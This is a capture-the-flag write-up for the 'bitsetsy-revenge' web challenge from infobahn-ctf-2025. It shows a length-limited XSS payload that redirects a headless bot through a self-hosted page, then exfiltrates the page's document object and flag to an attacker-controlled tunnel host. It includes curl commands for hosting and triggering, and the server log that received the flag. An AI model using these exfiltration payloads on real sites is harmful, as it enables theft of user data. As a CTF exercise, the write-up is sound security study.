---
title: bitsetsy-revenge
challenge_type: Web
author: "@rewhile @bawolff @yuu"
writeup_author: "@xabito"
competition: infobahn-ctf-2025
summary: |-
  bitset winked: tldr (●'◡'●)
connections:
  - url: https://bitset-revenge-web.challs3.infobahnc.tf
attachments:
  - title: This challenge uses the same attachment as bitset-revenge, please capture FLAG3
---

**Note:** This writeup is the third part of the `bitset` challenge series. In this revenge challenge, a fix has been implemented to prevent the unintended solution described in [bitset](/competitions/infobahn-ctf-2025/bitset/). The first and second parts of the series are [bitset-revenge](/competitions/infobahn-ctf-2025/bitset-revenge/) and [bitsets-revenge](/competitions/infobahn-ctf-2025/bitsets-revenge/), respectively.

## Recon

In this final challenge, our goal is to extract `FLAG3` by exploiting the same XSS vulnerability and exfiltrating the flag to a server we control. However, this time, the payload must be no longer than 55 characters in length.

```javascript
if (q.length <= 55) {
  flag23 = process.env.FLAG3 || "infobahn{fake_flag3}";
}
if (flag23) {
  await p.evaluateOnNewDocument(flag => {
    if (location.hostname == "127.0.0.1") {
      document["flag" + Math.random().toString(36).slice(2)] = flag;
    }
  }, flag23);
}
```

Excluding our domain name, our previous payload was already 62 characters long. Given the strict length limits, it appears impossible to create a payload that meets these requirements.

## Exploitation

However, since we can redirect the bot to any URL, we can host a custom HTML page that contains JavaScript within a `<script>` tag. This allows our payload to simply redirect the bot to our page, where we can execute a more complex exploit without being constrained by the original length limit.

Looking at the code, we see that the flag is only injected when the browser accesses `127.0.0.1`, so the flag will not be added on our site. To retrieve it, we need to set up a chain of redirects:

1. Submit a minimal XSS payload to the bot that redirects the browser to our malicious site.
2. The bot visits the `bitset` page and is immediately redirected to our site through the XSS.
3. The malicious website redirects the bot back to the `bitset` page, but with a longer payload.
4. The bot loads the `bitset` page once more, now using the longer payload. Since the original request’s payload was within the length limit, the flag is again injected into the page.
5. The new payload runs, exfiltrating the flag to our Tunnelmole server.

As with the previous challenges, we begin by starting a Tunnelmole server:

```bash
$ python3 -m http.server 8080 &

$ tmole 8080
Your Tunnelmole Public URLs are below and are accessible internet wide. Always use HTTPs for the best security
https://gkj6ar-ip-1-2-3-4.tunnelmole.net ⟶   http://localhost:8080
http://gkj6ar-ip-1-2-3-4.tunnelmole.net ⟶   http://localhost:8080
```

Because Tunnelmole domains are too lengthy for the strict character limit, we must host our HTML payload on a service that offers shorter URLs. We have used [envs.sh](https://envs.sh/), which provides compact, shareable links. Our HTML page will include the exact same payload used in the previous challenge:

```html
<!doctype html>
<body>
<script>
payload="http://'x=\")\"onerror='location=`http://gkj6ar-ip-1-2-3-4.tunnelmole.net/?${JSON.stringify(document)}`'";
location=`https://127.0.0.1:6969/?url=${payload}`;
</script>
```

To upload our HTML payload to `envs.sh`, we can use the following simple `curl` command:

```bash
$ curl -F'file=@payload.html' https://envs.sh
https://envs.sh/y6T.html
```

Finally, we trigger the bot by submitting a payload that redirects it to our hosted URL:

```
http://'x=")"onerror='location="//envs.sh/y6T.html"'
```

```bash
$ PAYLOAD="http://'x=\")\"onerror='location=\"//envs.sh/y6T.html\"'"

$ curl "https://bitset-revenge-web.challs3.infobahnc.tf/bot?url=${PAYLOAD}"
Cool image (●'◡'●)
```

## Flag capture

Once the bot follows our payload and completes the redirection sequence, we can obtain the flag by reviewing the logs from our Python server:

```
[200 OK] GET /?{{ '{' }}%22location%22:{{ '{' }}%22ancestorOrigins%22:{},%22href%22:%22http://127.0.0.1:6969/?url=http://%27x=%22)%22onerror=%27location=`http://gkj6ar-ip-1-2-3-4.tunnelmole.net/?${JSON.stringify(document)}`%27%22,%22origin%22:%22http://127.0.0.1:6969%22,%22protocol%22:%22http:%22,%22host%22:%22127.0.0.1:6969%22,%22hostname%22:%22127.0.0.1%22,%22port%22:%226969%22,%22pathname%22:%22/%22,%22search%22:%22?url=http://%27x=%22)%22onerror=%27location=`http://gkj6ar-ip-1-2-3-4.tunnelmole.net/?${JSON.stringify(document)}`%27%22,%22hash%22:%22%22},%22flaghm4zbqz1j7c%22:%22infobahn{We_ThiNK_Th47_y0U_@Re_INd3ed_A_W1zaRD}%22} Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/142.0.0.0 Safari/537.36
[404 Not Found] GET /favicon.ico Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/142.0.0.0 Safari/537.36
```

```
Flag: infobahn{We_ThiNK_Th47_y0U_@Re_INd3ed_A_W1zaRD}
```